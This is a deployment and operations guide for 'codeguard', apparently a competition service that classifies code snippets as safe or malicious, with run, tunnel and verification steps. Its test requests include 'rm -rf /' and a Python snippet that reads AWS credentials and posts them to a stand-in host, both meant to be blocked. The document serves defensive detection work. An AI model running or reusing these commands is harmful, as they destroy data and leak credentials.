# Deployment & Operations

**Deliverable #2:** a runnable service matching the fixed request/response schema,
with a public endpoint URL submitted to the organizer before the evaluation window.

---

## 1. Run locally

```bash
pip install -r requirements.txt
python -m uvicorn codeguard.api:app --host 0.0.0.0 --port 8000 --workers 1
```

* `--workers 1` so the ML model is loaded exactly once (in the FastAPI `lifespan`).
* Model: `models/ml.joblib` is committed and loaded at startup. If it is missing,
  the service trains a fallback model automatically (rules-only if scikit-learn
  is unavailable) — it never fails to start.
* Liveness / warm-up: `GET /health` → `{"status":"ok","models_loaded":true,"version":"0.1.0"}`.

Smoke test:

```bash
curl -X POST http://localhost:8000/check -H "Content-Type: application/json" \
  -d '{"code":"rm -rf /"}'
```

---

## 2. Public exposure

The judge calls the endpoint from outside your machine, so it must be reachable
on the public internet for the whole evaluation window. Options, cheapest first:

### a. Cloudflare quick tunnel (no account) — good for a quick public URL

```bash
# one-off download
#   https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe
cloudflared tunnel --url http://127.0.0.1:8000 --no-autoupdate
# prints:  https://<random-words>.trycloudflare.com
```

No browser interstitial is injected, so JSON `POST /check` calls from an
automated harness work. **The URL is random and dies when the process stops** — it
is fine for testing, but for the evaluation window run it on an always-on machine.

### b. ngrok

```bash
ngrok http 8000
```

### c. Cloudflare named tunnel (stable hostname, needs a Cloudflare account/domain)

```bash
cloudflared tunnel login
cloudflared tunnel create codeguard
cloudflared tunnel route dns codeguard codeguard.<your-domain>
cloudflared tunnel run --url http://127.0.0.1:8000 codeguard
```

### d. Small always-on host

Deploy the repo (or just the container) to any VM/PaaS and run the uvicorn command
above with a process supervisor; the committed `models/ml.joblib` (3.2 MB) makes
it work with no extra build step.

> **Keep it alive:** run the app and the tunnel under a supervisor (e.g.
> `nssm`, `pm2`, `systemd`, or Docker `restart: always`), and point uptime
> monitoring at `/health`.

---

## 3. Verify the public endpoint before submitting

```bash
BASE=https://<your-public-url>

curl -s $BASE/health
curl -s -X POST $BASE/check -H "Content-Type: application/json" \
  -d '{"code":"import os, requests\nopen(os.path.expanduser(\"~/.aws/credentials\")).read()\nrequests.post(\"http://example.invalid\", data=\"x\")"}'
# -> {"verdict":"block", "categories":["secret_access", ...], ...}

curl -s -X POST $BASE/check -H "Content-Type: application/json" -d '{"code":""}'
# -> {"verdict":"allow","risk_score":0.0,"code_language":"unknown","reason":"Empty input",...}
```

Expected behaviour to confirm before submitting:

| Input | Expected |
|---|---|
| malicious snippet | `verdict":"block"`, risk ≥ 0.5, categories non-empty |
| benign snippet | `verdict":"allow"`, risk < 0.5, empty categories |
| empty / malformed body | HTTP **200**, `allow`, `"Empty input"` (never 422/500) |
| any internal error / timeout | HTTP **200**, fail-closed `block` |

---

## 4. Operations notes

* **Never 4xx/5xx on `/check`** — custom exception handlers return HTTP 200 with
  `empty_input()` / `fail_closed()`; read the body manually (no strict Pydantic model).
* **Fail-safe** — missing model ⇒ rules-only; total failure ⇒ fail-closed block.
* **Logging** — log verdict/language/categories/latency; do not log full code in
  production (truncate).
* **`.env.example`** — no secrets, no LLM key; the service needs none.
* **Submit the URL to the organizer before the evaluation window** and re-verify
  it with the checks in §3 just before the window opens.
